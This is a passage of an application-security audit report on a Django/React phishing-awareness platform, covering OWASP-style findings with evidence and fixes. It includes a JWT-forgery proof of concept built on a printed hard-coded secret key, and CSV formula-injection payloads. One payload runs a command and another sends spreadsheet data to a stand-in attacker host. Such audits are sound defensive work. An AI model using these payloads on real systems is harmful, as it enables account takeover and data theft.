# PhishAware Security Audit — 2026-05-07

> **Auditor**: Senior application-security review (read-only).
> **Standard**: OWASP Top 10 (2021), OWASP API Security Top 10 (2023), ASVS v4/v5 where applicable.
> **Repository**: `c:\Users\alhar\OneDrive\Desktop\SeniorProject`
> **Commit audited**: `208ec218ebfeb1a0280e5b1b3ea29a20d7654fc5` (branch `main`)

---

## 1. Executive Summary

**Overall risk rating: HIGH.** PhishAware's data model and tenant scoping (`HasCompanyAccess`, `IsSameCompany`, `get_queryset` filters) are reasonably consistent and free of major BOLA bugs at the API layer. The serious findings are concentrated in **platform configuration**, **public endpoints**, **secret handling**, and **the lack of any rate limiting**. Several issues are one mis-set environment variable away from full production compromise.

### Top 5 issues to fix immediately

| # | Title | Severity |
|---|---|---|
| **F-001** | Hard-coded fallback `SECRET_KEY` reused as JWT signing key | **Critical** |
| **F-002** | Email-verification token written to log files at INFO level | **High** |
| **F-003** | Unauthenticated `GET /api/v1/companies/` exposes every customer's email, location, headcount, and average risk score | **High** |
| **F-004** | CSV injection in `generate_email_package` and `analytics/export/csv/` (employee-controlled `first_name` / `last_name` written unescaped) | **High** |
| **F-005** | `DEBUG=True` and `CORS_ALLOW_ALL_ORIGINS=True` are the in-repo defaults; insecure unless every deployment overrides them | **High** |

### Top 5 systemic weaknesses

1. **Zero rate limiting** anywhere in the API. Login, registration, password reset, resend-verification, employee invitation, and the public simulation feedback endpoint are all unthrottled (API4).
2. **Account enumeration** in `register_company`, `InviteEmployeeView`, `bulk invite`, and the login `email_not_verified` sentinel.
3. **Refresh-token reuse after password change.** `ChangePasswordView` and `reset_password` do not blacklist outstanding refresh tokens; a stolen token survives a password rotation (matches CVE-2024-22513 in `djangorestframework-simplejwt < 5.3.1`).
4. **JWT in `localStorage`** combined with at least one `dangerouslySetInnerHTML` sink. Any successful XSS exfiltrates the access *and* refresh token.
5. **Public Swagger / ReDoc.** `permission_classes=[AllowAny]` on the schema view publishes the full request shape of every endpoint to attackers (API9).

---

## 2. Scope & Method

- **Audited revision**: `208ec218eb…` on `main`, working tree clean except for this report.
- **Method**: read-only static review of every Django app under [Backend/apps/](Backend/apps/) (`accounts`, `companies`, `simulations`, `training`, `campaigns`, `analytics`, `assessments`, `notifications`, `community`, `gamification`, `core`), the root URL conf, settings, and the React frontend ([Frontend/src/](Frontend/src/)). No code was executed; no exploits were run against any deployment.
- **Files examined** (selection):
  - [Backend/phishaware_backend/settings.py](Backend/phishaware_backend/settings.py), [urls.py](Backend/phishaware_backend/urls.py)
  - [Backend/apps/accounts/models.py](Backend/apps/accounts/models.py), [serializers.py](Backend/apps/accounts/serializers.py), [views.py](Backend/apps/accounts/views.py), [urls.py](Backend/apps/accounts/urls.py), [urls_employees.py](Backend/apps/accounts/urls_employees.py)
  - [Backend/apps/simulations/models.py](Backend/apps/simulations/models.py), [views.py](Backend/apps/simulations/views.py), [services.py](Backend/apps/simulations/services.py), [urls.py](Backend/apps/simulations/urls.py)
  - [Backend/apps/companies/views.py](Backend/apps/companies/views.py), [serializers.py](Backend/apps/companies/serializers.py), [models.py](Backend/apps/companies/models.py)
  - [Backend/apps/analytics/views.py](Backend/apps/analytics/views.py)
  - [Backend/apps/core/emails.py](Backend/apps/core/emails.py), [permissions.py](Backend/apps/core/permissions.py), [password_validators.py](Backend/apps/core/password_validators.py)
  - [Frontend/src/api/axios.js](Frontend/src/api/axios.js), [contexts/AuthContext.jsx](Frontend/src/contexts/AuthContext.jsx), [pages/public/CommunityPortal.jsx](Frontend/src/pages/public/CommunityPortal.jsx)
  - [Backend/requirements.txt](Backend/requirements.txt), [Frontend/package.json](Frontend/package.json)
- **Not covered (and why)**:
  - Live SCA / SBOM extraction from a resolved lockfile — `Backend/requirements.txt` uses unbounded ranges (`Django>=5.0,<6.0`, etc.) so the *deployed* version cannot be determined from the repo alone. The CVE table in §7 is by package, and assumes the latest minor pin.
  - Dynamic testing (no exploitation, no requests issued).
  - Infrastructure / TLS / WAF posture (no deployment to inspect).
  - The `assessments` AI email generation endpoint and the `community` portal write paths beyond a quick scan — no findings noted, but coverage is shallow.

---

## 3. Attack Surface Map

Auth column legend: **Public** = `AllowAny`; **Auth** = `IsAuthenticated`; **Admin** = `IsSuperAdminOrCompanyAdmin`; **SuperAdmin** = `IsSuperAdmin`; **Company** = `IsAuthenticated + HasCompanyAccess`.

| Method | Path | View | Auth | Rate-limited |
|---|---|---|---|---|
| GET | `/admin/` | Django admin | login | No |
| GET | `/api/docs/`, `/api/redoc/` | drf-yasg | **Public** | No |
| POST | `/api/v1/auth/register/` | `RegisterView` | **Public** | **No** |
| POST | `/api/v1/auth/login/` | `CustomTokenObtainPairView` | **Public** | **No** |
| POST | `/api/v1/auth/logout/` | `LogoutView` | Auth | No |
| POST | `/api/v1/auth/token/refresh/` | SimpleJWT | **Public** | **No** |
| POST | `/api/v1/auth/verify-email/<uuid>/` | `VerifyEmailView` | **Public** | **No** |
| POST | `/api/v1/auth/resend-verification/` | `ResendVerificationView` | **Public** | **No** |
| POST | `/api/v1/auth/password-reset/` | `request_password_reset` | **Public** | **No** |
| POST | `/api/v1/auth/password-reset/<uuid>/` | `reset_password` | **Public** | **No** |
| GET/PATCH | `/api/v1/auth/profile/` | `UserProfileView` | Auth | No |
| POST | `/api/v1/auth/change-password/` | `ChangePasswordView` | Auth | No |
| POST | `/api/v1/employees/invite/` | `InviteEmployeeView` | Auth+CompanyAdmin | **No** |
| GET | `/api/v1/employees/invite/<uuid>/` | `GetInvitationDetailsView` | **Public** | **No** |
| POST | `/api/v1/employees/invite/<uuid>/accept/` | `AcceptInvitationView` | **Public** | **No** |
| GET | `/api/v1/employees/pending/` | `ListPendingInvitationsView` | Auth+CompanyAdmin | No |
| POST | `/api/v1/employees/<id>/resend/` | `ResendInvitationView` | Auth+CompanyAdmin | **No** |
| DELETE | `/api/v1/employees/<id>/cancel/` | `CancelInvitationView` | Auth+CompanyAdmin | No |
| GET | `/api/v1/companies/` | `CompanyViewSet.list` | **Public** | No |
| POST | `/api/v1/companies/register/` | `register_company` | **Public** | **No** |
| POST | `/api/v1/companies/` | `CompanyViewSet.create` | SuperAdmin | No |
| GET/PUT/PATCH | `/api/v1/companies/{id}/` | `CompanyViewSet` | Auth + same-company | No |
| DELETE | `/api/v1/companies/{id}/` | hard delete | SuperAdmin | No |
| POST | `/api/v1/companies/{id}/import_csv/` | bulk import | Auth+Admin | No |
| POST | `/api/v1/companies/{id}/invite_users/` | bulk invite | Auth+Admin | **No** |
| (CRUD) | `/api/v1/simulations/templates/`, `…/campaigns/`, `…/emails/` | viewsets | Company | No |
| POST | `/api/v1/simulations/campaigns/{id}/send/` | live send | Admin | No |
| POST | `/api/v1/simulations/campaigns/{id}/generate_package/` | CSV download | Admin | No |
| GET | `/api/v1/simulations/link/<token>/` | `track_link_click_view` | **Public** | **No** |
| GET | `/api/v1/simulations/landing/<token>/` | `landing_page_view` | **Public** | **No** |
| POST | `/api/v1/simulations/report/<token>/` | `report_phishing_view` | **Public** | **No** |
| POST | `/api/v1/simulations/credentials/<token>/` | `credentials_submitted_view` | **Public** | **No** |
| GET | `/api/v1/simulations/feedback/<token>/` | `simulation_feedback_view` | **Public** | **No** |
| (CRUD) | `/api/v1/training/...` | viewsets | Company / Admin | No |
| (CRUD) | `/api/v1/campaigns/...` | viewsets | Company | No |
| (CRUD) | `/api/v1/analytics/...` | viewsets | Auth+Admin | No |
| POST | `/api/v1/analytics/export/csv/` | `ExportViewSet.csv` | Auth+Admin | No |
| (CRUD) | `/api/v1/community/...` | public quizzes/articles | **Public** | No |
| (CRUD) | `/api/v1/notifications/` | per-user | Auth | No |
| (CRUD) | `/api/v1/gamification/...` | badges/points/leaderboard | Company / Admin | No |

The **bolded** rows are the public attack surface that an unauthenticated attacker can hit. None of them are throttled.

---

## 4. Findings

### F-001 — Hard-coded fallback `SECRET_KEY` is also the JWT signing key   [Severity: Critical]

- **Category**: A02 Cryptographic Failures / A05 Security Misconfiguration
- **Location**: [Backend/phishaware_backend/settings.py:34](Backend/phishaware_backend/settings.py#L34) and [settings.py:212](Backend/phishaware_backend/settings.py#L212)
- **Description**: The Django `SECRET_KEY` has a hard-coded fallback inside the repository. The same value is then used as `SIMPLE_JWT['SIGNING_KEY']`. If any deployment forgets to set `SECRET_KEY` in `.env`, **every JWT it issues can be forged by anyone with read access to the public repo** — including session hijack of `SUPER_ADMIN` accounts.
- **Evidence**:
  ```python
  SECRET_KEY = config('SECRET_KEY',
      default='django-insecure-&+jx(5h3-uiue7c&#mlh&fy36_apxb!hazdmophn#%934475^a')
  ...
  SIMPLE_JWT = {
      'SIGNING_KEY': SECRET_KEY,
      'ALGORITHM': 'HS256',
      ...
  }
  ```
- **Proof of concept**:
  ```python
  import jwt, time
  SECRET = "django-insecure-&+jx(5h3-uiue7c&#mlh&fy36_apxb!hazdmophn#%934475^a"
  fake = jwt.encode({
      'user_id': 1, 'role': 'SUPER_ADMIN',
      'token_type': 'access', 'exp': int(time.time()) + 3600,
      'iat': int(time.time()), 'jti': 'xxx'
  }, SECRET, algorithm='HS256')
  # curl -H "Authorization: Bearer $fake" https://target/api/v1/companies/
  ```
- **Impact**: Full takeover of any deployment that didn't override `SECRET_KEY`. Compromise of session integrity, password-reset CSRF tokens, signed cookies.
- **Remediation**:
  ```diff
  - SECRET_KEY = config('SECRET_KEY', default='django-insecure-&+jx(5h3-uiue7c&#mlh&fy36_apxb!hazdmophn#%934475^a')
  + SECRET_KEY = config('SECRET_KEY')   # raise on missing
  + JWT_SIGNING_KEY = config('JWT_SIGNING_KEY')
  ...
  - 'SIGNING_KEY': SECRET_KEY,
  + 'SIGNING_KEY': JWT_SIGNING_KEY,
  ```
  Generate fresh values (`python -c "import secrets; print(secrets.token_urlsafe(64))"`) and treat them as separate secrets so a leak of one does not compromise the other.

---

### F-002 — Email-verification token logged at INFO level   [Severity: High]

- **Category**: A09 Security Logging Failures / A07 Authentication Failures
- **Location**: [Backend/apps/companies/views.py:850-859](Backend/apps/companies/views.py#L850-L859)
- **Description**: `register_company` logs the full UUID `verification_token` for every new company-admin signup. The same token is the bearer-style credential used by `POST /api/v1/auth/verify-email/<uuid>/`. Any log shipper, backup, or oncall engineer reading logs can verify-and-activate a freshly-registered admin account before the legitimate user clicks the email link.
- **Evidence**:
  ```python
  _logger.info('=' * 60)
  _logger.info('REGISTRATION: user=%s company=%s token=%s',
               admin_email, company_name, admin_user.verification_token)
  _logger.info('FRONTEND_URL=%s', settings.FRONTEND_URL)
  ```
  The `apps.*` namespace is configured at `DEBUG` level in [settings.py:288-292](Backend/phishaware_backend/settings.py#L288-L292), so this is always emitted.
- **Impact**: Pre-auth account-takeover from log access. If logs flow to a SaaS aggregator (Datadog, CloudWatch, ELK) the secret is now also there.
- **Remediation**:
  ```diff
  - _logger.info('REGISTRATION: user=%s company=%s token=%s',
  -              admin_email, company_name, admin_user.verification_token)
  + _logger.info('REGISTRATION: user=%s company=%s', admin_email, company_name)
  ```
  Audit `apps/accounts/views.py` and the email helpers for any other code paths that log tokens.

---

### F-003 — Unauthenticated company directory leaks email, location, headcount, and risk score   [Severity: High]

- **Category**: A01 Broken Access Control / A04 Insecure Design
- **Location**: [Backend/apps/companies/views.py:104-107](Backend/apps/companies/views.py#L104-L107) (the `list` action is `AllowAny`) and [Backend/apps/companies/serializers.py:31-40](Backend/apps/companies/serializers.py#L31-L40) (`CompanyListSerializer.fields`).
- **Description**: The list endpoint is intentionally public so the registration page can populate a company picker, but `CompanyListSerializer` returns far more than is needed:
  ```python
  fields = ['id', 'name', 'name_ar', 'email', 'industry', 'company_size',
            'country', 'city', 'is_active', 'is_subscription_active',
            'total_users', 'total_employees', 'total_admins',
            'average_risk_score',
            'subscription_start_date', 'subscription_end_date',
            'created_at']
  ```
  Anyone can `curl -s https://target/api/v1/companies/` and obtain — for every customer — the company contact email, headcount split between admins / employees, subscription dates, and the **average phishing-risk score of their employees**.
- **Proof of concept**:
  ```
  $ curl -s https://target/api/v1/companies/?page_size=100 | jq '.results[0]'
  { "name": "Bank of X",
    "email": "ciso@bankofx.com",
    "total_employees": 540,
    "average_risk_score": 71.4, ... }
  ```
- **Impact**: Competitive intelligence (which orgs are paying customers), reconnaissance for spear-phishing the disclosed admin email, public ranking of which customers' employees are most likely to click. This is exactly the data PhishAware is paid to keep private.
- **Remediation**:
  ```diff
  # Backend/apps/companies/serializers.py
  + class PublicCompanyListSerializer(serializers.ModelSerializer):
  +     class Meta:
  +         model = Company
  +         fields = ['id', 'name', 'name_ar']

  # Backend/apps/companies/views.py
  def get_serializer_class(self):
  +    if self.action == 'list' and not self.request.user.is_authenticated:
  +        return PublicCompanyListSerializer
       if self.action in ['create', 'update', 'partial_update']:
           return CompanyCreateSerializer
  ```
  Better still: do not expose the list publicly at all. Have the registration page accept a free-text company name (only a company *exists* if its admins have already been provisioned).

---

### F-004 — CSV-formula injection in package generation and analytics export   [Severity: High]

- **Category**: A03 Injection
- **Location**:
  - [Backend/apps/simulations/services.py:147-157](Backend/apps/simulations/services.py#L147-L157) — `generate_email_package`
  - [Backend/apps/analytics/views.py:1399](Backend/apps/analytics/views.py#L1399) — `_export_users` (and the other `_export_*` helpers above it).
- **Description**: Both helpers write user-controlled fields (`employee.email`, `employee.first_name`, `employee.last_name`, `employee.get_full_name()`, `template.subject`, `template.body_html`) directly into CSV cells with `csv.writer`. The CSV is downloaded by company admins and almost certainly opened in Excel / LibreOffice. A malicious employee whose `first_name` is `=cmd|'/c calc'!A0` or `=HYPERLINK("https://attacker/?x="&A1,"Click")` triggers formula execution / data exfiltration in the admin's spreadsheet.
- **Evidence** (`generate_email_package`):
  ```python
  writer.writerow([
      employee.email,
      employee_name,           # <-- attacker-controlled (first_name + last_name)
      phishing_link_url,
      subject,
      body_html, body_plain, ...
  ])
  ```
  No call to a sanitizer, no `'` prefix on suspicious cells.
- **Proof of concept**:
  1. Self-register or be invited as `EMPLOYEE`.
  2. Set first name to `=HYPERLINK("https://attacker.test/?c="&A2,"Open me")`.
  3. Wait for company admin to download `simulation_campaign_<id>_emails.csv` or any analytics export.
  4. When admin opens in Excel, the cell exfiltrates the adjacent email column to attacker.
- **Impact**: One-click admin compromise / data exfiltration; high reputational damage given the product's purpose is anti-phishing.
- **Remediation** — neutralize before writing:
  ```python
  # Backend/apps/core/csv_utils.py (new)
  _DANGEROUS_PREFIXES = ('=', '+', '-', '@', '\t', '\r')

  def csv_safe(value):
      if value is None:
          return ''
      s = str(value)
      if s.startswith(_DANGEROUS_PREFIXES):
          return "'" + s
      return s
  ```
  ```diff
  - writer.writerow([employee.email, employee_name, ...])
  + writer.writerow([csv_safe(x) for x in (employee.email, employee_name, ...)])
  ```
  Apply to every `writer.writerow` in `simulations/services.py` and `analytics/views.py`. Also set `Content-Type: text/csv; charset=utf-8` (already done) and consider `Content-Disposition: attachment` everywhere (already done).

---

### F-005 — Insecure-by-default `DEBUG=True` and `CORS_ALLOW_ALL_ORIGINS`   [Severity: High]

- **Category**: A05 Security Misconfiguration / API8
- **Location**: [Backend/phishaware_backend/settings.py:37](Backend/phishaware_backend/settings.py#L37), [302-303](Backend/phishaware_backend/settings.py#L302-L303)
- **Description**: `DEBUG=True` is the in-repo default. `ALLOWED_HOSTS` defaults to `localhost,127.0.0.1` (so a production deployment that only runs `python manage.py runserver` in DEBUG mode will *still respond* to any request via the reverse proxy because `DEBUG=True` disables the host check). When `DEBUG` is true the code also flips `CORS_ALLOW_ALL_ORIGINS = True`, defeating the explicit `CORS_ALLOWED_ORIGINS` allowlist. There is no enforced CSP, HSTS, or `SECURE_REFERRER_POLICY`.
- **Evidence**:
  ```python
  DEBUG = config('DEBUG', default=True, cast=bool)
  ALLOWED_HOSTS = config('ALLOWED_HOSTS', default='localhost,127.0.0.1', ...)
  ...
  if DEBUG:
      CORS_ALLOW_ALL_ORIGINS = True
  else:
      SECURE_SSL_REDIRECT = True
      SESSION_COOKIE_SECURE = True
      CSRF_COOKIE_SECURE = True
      SECURE_BROWSER_XSS_FILTER = True
      SECURE_CONTENT_TYPE_NOSNIFF = True
      X_FRAME_OPTIONS = 'DENY'
  ```
  Missing in both branches: `SECURE_HSTS_SECONDS`, `SECURE_HSTS_INCLUDE_SUBDOMAINS`, `SECURE_HSTS_PRELOAD`, `SECURE_REFERRER_POLICY`, `SECURE_PROXY_SSL_HEADER`, any CSP middleware.
- **Impact**: Verbose tracebacks (Django debug page leaks settings, file paths, env), CORS bypass, no transport-security pinning.
- **Remediation**:
  ```diff
  - DEBUG = config('DEBUG', default=True, cast=bool)
  + DEBUG = config('DEBUG', default=False, cast=bool)
  - ALLOWED_HOSTS = config('ALLOWED_HOSTS', default='localhost,127.0.0.1', ...)
  + ALLOWED_HOSTS = config('ALLOWED_HOSTS', cast=lambda v: [s.strip() for s in v.split(',')])
  ```
  Add (production block):
  ```python
  SECURE_HSTS_SECONDS = 31536000
  SECURE_HSTS_INCLUDE_SUBDOMAINS = True
  SECURE_HSTS_PRELOAD = True
  SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'
  SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
  ```
  Add `django-csp` and pin `default-src 'self'`; add `nonce` for any inline script in email landing pages.

---

### F-006 — Refresh token survives password change   [Severity: High]

- **Category**: A07 Authentication Failures / API2
- **Location**: [Backend/apps/accounts/views.py:253-277](Backend/apps/accounts/views.py#L253-L277) (`ChangePasswordView`) and [accounts/views.py:602-643](Backend/apps/accounts/views.py#L602-L643) (`reset_password`).
- **Description**: When a user changes or resets their password, the code calls `user.set_password()` and `user.save()`. It never iterates `OutstandingToken` and calls `.blacklist()`. With `ROTATE_REFRESH_TOKENS=True` and `BLACKLIST_AFTER_ROTATION=True`, an attacker who stole a refresh token before the change can keep refreshing access tokens until the refresh token's natural 7-day expiry. (This is the same root cause as `djangorestframework-simplejwt` advisory **GHSA-7jjh-3rxh-fhqg / CVE-2024-22513** in versions `< 5.3.1`.)
- **Evidence**:
  ```python
  user.set_password(serializer.validated_data['new_password'])
  user.save()
  # No OutstandingToken sweep; no token blacklist.
  ```
- **Impact**: Stolen refresh tokens (e.g. via XSS — see F-013 / F-015) keep working after the user "rotates" their password. Standard incident response is broken.
- **Remediation**:
  ```python
  from rest_framework_simplejwt.token_blacklist.models import OutstandingToken, BlacklistedToken

  for ot in OutstandingToken.objects.filter(user=user):
      BlacklistedToken.objects.get_or_create(token=ot)
  ```
  Apply in both `ChangePasswordView.post` and `reset_password`.

---

### F-007 — Account / email enumeration on registration, invitation, login, and reset   [Severity: High]

- **Category**: A04 Insecure Design / API2
- **Locations**:
  - [accounts/views.py:310-314](Backend/apps/accounts/views.py#L310-L314) (`InviteEmployeeView` — distinguishes existing user)
  - [companies/views.py:818-822](Backend/apps/companies/views.py#L818-L822) (`register_company` — distinguishes existing user / company)
  - [accounts/serializers.py:101-109](Backend/apps/accounts/serializers.py#L101-L109) (login response includes the sentinel `email_not_verified: True` only for *registered* unverified emails)
  - [companies/views.py:493-503](Backend/apps/companies/views.py#L493-L503) (`invite_users` — returns `existing_emails` list)
- **Description**: The verification-resend and password-reset endpoints are correctly designed (they return identical responses regardless of whether the email exists). But the four locations above leak that a given email is registered. The login path is the worst because it can be used unauthenticated and tells the attacker exactly which addresses are valid users awaiting verification (i.e. fresh attack targets).
- **Evidence (`InviteEmployeeView`)**:
  ```python
  if User.objects.filter(email=email).exists():
      return Response({'error': 'A user with this email already exists.'},
                      status=status.HTTP_400_BAD_REQUEST)
  ```
  **(`register_company`)**:
  ```python
  if Company.objects.filter(name__iexact=company_name).exists():
      return Response({'error': 'A company with that name already exists.'}, ...)
  if User.objects.filter(email=admin_email).exists():
      return Response({'error': 'A user with that email already exists.'}, ...)
  ```
- **Impact**: Bulk enumeration of registered emails / company tenants for spear phishing, credential-stuffing target list curation.
- **Remediation**: For unauthenticated endpoints (`register`, `register_company`, login), always return a generic success/failure that does not depend on existence. For authenticated invite endpoints (`InviteEmployeeView`), it is acceptable to reveal "already in your company" but **not** "exists in another company"; the bulk path already segregates these (`existing` vs. `errors`) so collapse them in the response.

---

### F-008 — No rate limiting anywhere in the API   [Severity: High]

- **Category**: API4 Unrestricted Resource Consumption / A04
- **Locations**: every endpoint in §3 marked **No** in the rate-limited column.
- **Description**: The DRF settings ([settings.py:178-202](Backend/phishaware_backend/settings.py#L178-L202)) define no `DEFAULT_THROTTLE_CLASSES` and no `DEFAULT_THROTTLE_RATES`. Consequently:
  - **Login** (`/api/v1/auth/login/`) is open to credential stuffing.
  - **Register** (`/api/v1/auth/register/`) is open to mass account creation that quietly increments DB rows, sends emails on the company's verified-sender quota, and pollutes RiskScore tables.
  - **Resend-verification** and **password-reset** can be used as **email bombs** against any address (`request_password_reset` only returns 200 but it *does* mutate `password_reset_token` and dispatches an email every call — see [accounts/views.py:583-589](Backend/apps/accounts/views.py#L583-L589)).
  - **Public simulation feedback** (`GET /api/v1/simulations/feedback/<token>/`) leaks subject/red-flags/employee-name; with a leaked token it can be polled freely.
  - **Tracking link** (`GET /api/v1/simulations/link/<token>/`) creates an unbounded number of `TrackingEvent` rows per request — a single replayed link is a storage / log DoS (the inline statistic update in [simulations/models.py:632-637](Backend/apps/simulations/models.py#L632-L637) is idempotent on `total_clicked`, but the event log itself is not deduplicated).
- **Impact**: Outbound email cost & reputation damage, DB growth attacks, brute force, harassment of users via reset/resend bombing.
- **Remediation**: Adopt DRF's built-in throttling (sufficient for v1) and front it with a network-layer throttle (Cloudflare, ALB rules) for production:
  ```python
  REST_FRAMEWORK['DEFAULT_THROTTLE_CLASSES'] = [
      'rest_framework.throttling.AnonRateThrottle',
      'rest_framework.throttling.UserRateThrottle',
      'rest_framework.throttling.ScopedRateThrottle',
  ]
  REST_FRAMEWORK['DEFAULT_THROTTLE_RATES'] = {
      'anon': '60/hour',
      'user': '600/hour',
      'login': '10/min',
      'reset': '5/hour',
      'invite': '30/hour',
      'tracking': '60/hour',
  }
  ```
  Then on each public view, e.g.:
  ```python
  class CustomTokenObtainPairView(TokenObtainPairView):
      throttle_scope = 'login'
  ```
  Also de-dupe `TrackingEvent` creation on `LINK_CLICKED` — only create an event when `not email_sim.was_clicked`.

---

### F-009 — Public Swagger/ReDoc schema disclosure   [Severity: Medium]

- **Category**: API9 Improper Inventory Management / A05
- **Location**: [Backend/phishaware_backend/urls.py:31-50](Backend/phishaware_backend/urls.py#L31-L50)
- **Description**: `get_schema_view(... public=True, permission_classes=[permissions.AllowAny])` publishes the entire API surface, including admin-only routes, parameter shapes, and example payloads, to anonymous users. This both accelerates exploit development and broadcasts internal endpoints (e.g. `import_csv`, `bulk_award`).
- **Remediation**:
  ```diff
  - permission_classes=[permissions.AllowAny],
  + permission_classes=[permissions.IsAdminUser],
  ```
  And restrict route inclusion to `if settings.DEBUG:` if you only want them in non-prod.

---

### F-010 — Sensitive data stored in `localStorage`   [Severity: Medium]

- **Category**: A07 Authentication Failures / A05
- **Location**: [Frontend/src/api/axios.js:26-38](Frontend/src/api/axios.js#L26-L38), [contexts/AuthContext.jsx:84](Frontend/src/contexts/AuthContext.jsx#L84)
- **Description**: Both the **access** and **refresh** JWTs, plus the cached `user` profile, live in `localStorage`. Any successful XSS — including F-011 below — exfiltrates the refresh token, which is valid for 7 days and gives an attacker arbitrary access to the user's account from anywhere. The docstring of `AuthContext` claims access tokens use `sessionStorage`, but the code path actually writes them to `localStorage`.
- **Remediation**: Move tokens to `httpOnly; Secure; SameSite=Strict` cookies and use Django CSRF middleware for the protected routes. Short-term mitigation: switch to `sessionStorage` for the access token and never persist the refresh token in client storage at all (use a cookie + token rotation).

---

### F-011 — `dangerouslySetInnerHTML` over server-supplied HTML   [Severity: Medium]

- **Category**: A03 Injection (Stored XSS)
- **Location**: [Frontend/src/pages/public/CommunityPortal.jsx:265](Frontend/src/pages/public/CommunityPortal.jsx#L265)
- **Description**: Community challenge HTML is rendered with `dangerouslySetInnerHTML={{ __html: challenge.body_html }}`. The content originates from `community` admin write paths, but the page is publicly accessible and the HTML is not sanitized client-side. A privileged but compromised account (or any future field that pulls `body_html` from a user-writable model) becomes a stored-XSS sink — and the page runs in the same origin as F-010's tokens.
- **Evidence**:
  ```jsx
  <div
      className="bg-white dark:bg-gray-900 text-sm"
      style={{ zoom: 0.85 }}
      dangerouslySetInnerHTML={{ __html: challenge.body_html }}
  />
  ```
- **Remediation**: Render through DOMPurify (`npm i dompurify`):
  ```jsx
  import DOMPurify from 'dompurify';
  ...
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(challenge.body_html) }}
  ```
  Or, better, render community content as Markdown via `react-markdown` and never accept HTML.

---

### F-012 — Inconsistent email-case normalization permits duplicate accounts   [Severity: Medium]

- **Category**: A07 Authentication Failures / A04
- **Location**: [accounts/models.py:22](Backend/apps/accounts/models.py#L22) (`UserManager.create_user` only normalizes the *domain*); [accounts/serializers.py:51-58](Backend/apps/accounts/serializers.py#L51-L58) (`UserRegistrationSerializer` does not lowercase the local part). Compare with [accounts/views.py:302](Backend/apps/accounts/views.py#L302) (`InviteEmployeeView` *does* `.strip().lower()`) and [companies/views.py:494-507](Backend/apps/companies/views.py#L494-L507) (`invite_users` uses `email__iexact`).
- **Description**: `Foo@Example.com` and `foo@example.com` can both register successfully because Django's default `email` field uniqueness is case-sensitive on PostgreSQL. The verify/resend code path looks up `User.objects.filter(email=email)` (case-sensitive). Together this enables (a) account squatting — attacker registers `Victim@x.com` first; victim later cannot register `victim@x.com`; (b) collision with later case-insensitive checks (`email__iexact`) which then match *both* rows and silently use the wrong one.
- **Remediation**:
  ```python
  # accounts/serializers.py
  def validate_email(self, value):
      return value.strip().lower()
  ```
  Add a migration that lowercases all existing `email` rows and constraints them with a `LOWER(email)` unique index (`UniqueConstraint(Lower('email'))`).

---

### F-013 — `LogoutView` and `ExportViewSet.csv` echo raw exception text to clients   [Severity: Medium]

- **Category**: A09 Logging & Monitoring Failures / A05
- **Location**: [accounts/views.py:113-118](Backend/apps/accounts/views.py#L113-L118), [analytics/views.py:1239-1240](Backend/apps/analytics/views.py#L1239-L1240)
- **Description**: Both blocks return `{'error': str(e)}` to the API caller. With `DEBUG=False` Django's middleware suppresses tracebacks on the request error path, but these views explicitly bypass that protection by serializing the exception. Information likely leaked: SQL errors, file-system paths, library internals, redacted tokens.
- **Remediation**:
  ```diff
  - return Response({'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)
  + logger.exception('logout failed')
  + return Response({'error': 'Invalid token.'}, status=status.HTTP_400_BAD_REQUEST)
  ```

---

### F-014 — `import_csv` parses uploaded file fully into memory and creates users without invitation   [Severity: Medium]

- **Category**: A04 Insecure Design / API4
- **Location**: [companies/views.py:536-634](Backend/apps/companies/views.py#L536-L634)
- **Description**: `csv_file.read().decode('utf-8')` is called without a streaming reader. The 5 MB cap in [serializers.py:358-360](Backend/apps/companies/serializers.py#L358-L360) is a soft client-side check — DRF still buffers the file in memory and a single admin can import a CSV that produces tens of thousands of `User.objects.create(...)` calls inside one `@transaction.atomic`. Each created user has `is_active=True, is_verified=False`, no `set_password()` invitation token, and no email is dispatched (`# TODO: Send invitation email`). Net effect: rows that nobody can ever log into, but that pollute uniqueness checks for legitimate invites.
- **Remediation**: Stream-parse the CSV (`for row in csv.DictReader(io.TextIOWrapper(csv_file, encoding='utf-8'))`), rate-limit to N rows per minute, dispatch an actual invitation token (re-use `InviteEmployeeView` machinery), and reject non-`text/csv` MIME types. Add a hard row limit (e.g. 1 000 per call).

---

### F-015 — Anonymous tracking link can spam `TrackingEvent` rows   [Severity: Medium]

- **Category**: API4 Unrestricted Resource Consumption / A04
- **Location**: [simulations/views.py:947-956](Backend/apps/simulations/views.py#L947-L956)
- **Description**: Every `GET /api/v1/simulations/link/<token>/` creates a fresh `TrackingEvent` row, even after `email_simulation.was_clicked` is already `True`. Mail security gateways, link-preview systems, and corporate proxies routinely re-fetch URLs — under normal load this floods the event table with duplicate `LINK_CLICKED` records, and a hostile actor with one leaked link can issue tens of thousands of requests to bloat storage. Inline counters are idempotent (counts are recomputed via `email_simulations.filter(was_clicked=True).count()`) but the `TrackingEvent` log itself is not.
- **Remediation**:
  ```diff
  - if email_sim.campaign.track_link_clicks:
  + if email_sim.campaign.track_link_clicks and not email_sim.was_clicked:
        TrackingEvent.objects.create(...)
  ```
  Plus an `AnonRateThrottle` (`tracking` scope) on these views.

---

### F-016 — Public `simulation_feedback_view` returns employee PII for any token holder   [Severity: Medium]

- **Category**: A01 Broken Access Control / API3
- **Location**: [simulations/views.py:1166-1202](Backend/apps/simulations/views.py#L1166-L1202)
- **Description**: With a known `link_token` (256-bit, so not enumerable, but tokens regularly leak via mail forwards, browser history, and link previewers) anyone receives back the employee's full name (or email-prefix as fallback), the campaign template name, attack vector, difficulty, red-flags list, and message body. None of this is needed by the React caught-page beyond what the user already sees — except the employee's own first name. The endpoint is also unrate-limited.
- **Remediation**: Restrict the response to fields the page actually uses. Do not return another employee's PII to a token holder who is not that employee. If unauth is required, hash the link token before lookup and don't return employee identifiers at all.

---

### F-017 — `register_company` & `InviteEmployeeView` allow attacker to claim a company name   [Severity: Medium]

- **Category**: A04 Insecure Design
- **Location**: [companies/views.py:787-871](Backend/apps/companies/views.py#L787-L871)
- **Description**: `register_company` is `AllowAny`, has no domain verification step, and creates a `Company` row plus a `COMPANY_ADMIN` user with the submitted email as both the company contact and the admin login. There is no proof that the registrant owns `bankofx.com`. An attacker can pre-register `Acme Corp`, blocking the real Acme from signing up (we now also have F-007 letting attackers enumerate which company names are taken).
